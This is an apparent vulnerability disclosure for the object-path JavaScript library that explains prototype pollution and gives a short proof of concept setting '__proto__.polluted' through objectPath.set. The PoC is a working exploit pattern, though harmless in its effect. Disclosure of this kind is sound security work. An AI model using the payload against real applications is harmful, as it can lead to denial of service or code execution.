# Overview

object-path is a tiny JavaScript utility to access deep properties using a path (for Node and the Browser) 

Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.

# Proof of Concept

```js
var objectPath = require("object-path");

var obj = {};
console.log("Before: " + obj.polluted);
objectPath.set(obj, "__proto__.polluted", "pwned!"); 
console.log("After: " + obj.polluted);
```
